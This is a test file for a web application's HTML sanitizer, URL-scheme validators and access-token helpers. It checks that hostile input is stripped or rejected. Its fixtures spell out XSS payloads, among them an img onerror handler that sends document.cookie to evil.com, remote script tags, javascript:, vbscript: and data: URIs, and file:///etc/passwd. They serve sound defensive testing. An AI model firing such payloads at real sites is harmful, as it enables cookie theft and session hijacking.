import test from 'node:test'
import assert from 'node:assert/strict'

import { sanitizeArticleHtml } from '../../app/utils/sanitizeHtml.ts'
import { isSafeExternalUrl, sanitizeExternalUrl } from '../../app/utils/security.ts'
import { assertSafeExternalUrl } from '../../server/utils/security.ts'
import { readAccessToken, resolveCaller } from '../../server/utils/auth.ts'

test('sanitizeArticleHtml - Stored XSS Mitigation for Rich Text', async (t) => {
  await t.test('strips <script> tags and executable content', () => {
    const dirty = '<p>Normal text</p><script>alert(1)</script><script src="https://evil.com/x.js"></script>'
    const clean = sanitizeArticleHtml(dirty)
    assert.ok(!clean.includes('<script'), 'Must not contain script tags')
    assert.ok(!clean.includes('alert(1)'), 'Must not contain script payload')
    assert.ok(!clean.includes('evil.com'), 'Must not contain remote script source')
    assert.ok(clean.includes('<p>Normal text</p>'), 'Must preserve safe text')
  })

  await t.test('strips onerror, onload, and other inline event handlers from tags', () => {
    const dirty = '<img src="https://example.com/pic.jpg" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)"><svg onload="alert(1)"><body onload="alert(2)">'
    const clean = sanitizeArticleHtml(dirty)
    assert.ok(!clean.includes('onerror'), 'Must strip onerror attribute')
    assert.ok(!clean.includes('onload'), 'Must strip onload attribute')
    assert.ok(!clean.includes('evil.com'), 'Must strip handler payload')
    assert.ok(!clean.includes('<svg'), 'Must strip svg tag')
    assert.ok(clean.includes('src="https://example.com/pic.jpg"'), 'Must keep safe image source')
  })

  await t.test('neutralizes javascript: URIs in anchor tags', () => {
    const dirty = '<a href="javascript:alert(document.domain)">Click Me</a>'
    const clean = sanitizeArticleHtml(dirty)
    assert.ok(!clean.includes('javascript:'), 'Must not allow javascript: in href')
    assert.ok(!clean.includes('href'), 'Must remove dangerous href attribute entirely')
    assert.ok(clean.includes('Click Me'), 'Must preserve link text')
  })

  await t.test('strips iframe, embed, object, and form tags', () => {
    const dirty = '<iframe src="https://evil.com"></iframe><embed src="test.swf"><object data="test.pdf"></object><form action="https://evil.com"><input type="password"></form>'
    const clean = sanitizeArticleHtml(dirty)
    assert.ok(!clean.includes('<iframe'), 'Must strip iframe')
    assert.ok(!clean.includes('<embed'), 'Must strip embed')
    assert.ok(!clean.includes('<object'), 'Must strip object')
    assert.ok(!clean.includes('<form'), 'Must strip form')
    assert.ok(!clean.includes('<input'), 'Must strip input')
  })

  await t.test('preserves legitimate article markup and adds rel noopener', () => {
    const legitimate = '<h1>Article Title</h1><p>Welcome to <strong>Burhan</strong> with <em>emphasis</em>.</p><blockquote>Quote</blockquote><a href="https://burhan.ainux.online/docs">Documentation</a>'
    const clean = sanitizeArticleHtml(legitimate)
    assert.ok(clean.includes('<h1>Article Title</h1>'))
    assert.ok(clean.includes('<strong>Burhan</strong>'))
    assert.ok(clean.includes('<blockquote>Quote</blockquote>'))
    assert.ok(clean.includes('href="https://burhan.ainux.online/docs"'))
    assert.ok(clean.includes('rel="noopener noreferrer"'), 'Must add noopener noreferrer to external links')
    assert.ok(clean.includes('target="_blank"'), 'Must add target _blank')
  })
})

test('URL Scheme Hardening - isSafeExternalUrl & sanitizeExternalUrl', async (t) => {
  await t.test('accepts valid http and https URLs', () => {
    assert.equal(isSafeExternalUrl('https://example.com/threat'), true)
    assert.equal(isSafeExternalUrl('http://example.com/page?query=1#frag'), true)
    assert.equal(sanitizeExternalUrl('https://example.com'), 'https://example.com')
  })

  await t.test('rejects javascript: and pseudo protocols', () => {
    const payloads = [
      'javascript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'javascript:/*--></title></style></textarea><em><script>alert(1)</script>',
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
      'blob:https://burhan.ainux.online/uuid',
    ]

    for (const payload of payloads) {
      assert.equal(isSafeExternalUrl(payload), false, `Should reject ${payload}`)
      assert.equal(sanitizeExternalUrl(payload), '#', `Should sanitize ${payload} to '#'`)
    }
  })

  await t.test('rejects relative, protocol-relative, and malformed strings', () => {
    assert.equal(isSafeExternalUrl('//evil.com/payload'), false)
    assert.equal(isSafeExternalUrl('/internal/path'), false)
    assert.equal(isSafeExternalUrl('not-a-url'), false)
    assert.equal(isSafeExternalUrl(''), false)
    assert.equal(isSafeExternalUrl(null), false)
    assert.equal(isSafeExternalUrl(undefined), false)
    assert.equal(sanitizeExternalUrl(null), '#')
    assert.equal(sanitizeExternalUrl(''), '#')
  })
})

test('Server URL Assertion - assertSafeExternalUrl', async (t) => {
  await t.test('validates and returns clean http/https URL', () => {
    const clean = assertSafeExternalUrl('  https://safe.com/report  ', 'Source URL')
    assert.equal(clean, 'https://safe.com/report')
  })

  await t.test('throws 400 for javascript: URI', () => {
    assert.throws(
      () => assertSafeExternalUrl('javascript:alert(1)', 'Source URL'),
      (err) => err.statusCode === 400 && err.statusMessage.includes('must use http or https protocol')
    )
  })

  await t.test('throws 400 for empty or invalid URL', () => {
    assert.throws(
      () => assertSafeExternalUrl('', 'Source URL'),
      (err) => err.statusCode === 400 && err.statusMessage.includes('is required')
    )
    assert.throws(
      () => assertSafeExternalUrl('not-a-valid-url', 'Source URL'),
      (err) => err.statusCode === 400 && err.statusMessage.includes('Invalid')
    )
  })
})

test('Authentication & Endpoint Security - Admin Endpoint Protection', async (t) => {
  await t.test('readAccessToken extracts Bearer header', () => {
    const event = { req: {}, node: { req: { headers: { authorization: 'Bearer test-token-123' } } } }
    const token = readAccessToken(event)
    assert.equal(token, 'test-token-123')
  })

  await t.test('readAccessToken falls back to body.accessToken', () => {
    const event = { node: { req: { headers: {} } } }
    const token = readAccessToken(event, { accessToken: 'body-token-456' })
    assert.equal(token, 'body-token-456')
  })

  await t.test('readAccessToken returns undefined when no credentials provided', () => {
    const event = { node: { req: { headers: {} } } }
    const token = readAccessToken(event, {})
    assert.equal(token, undefined)
  })

  await t.test('resolveCaller throws 401 when token is missing', async () => {
    const event = { node: { req: { headers: {} } } }
    await assert.rejects(
      async () => resolveCaller(event, null),
      (err) => err.statusCode === 401 && err.statusMessage === 'Missing access token'
    )
  })
})
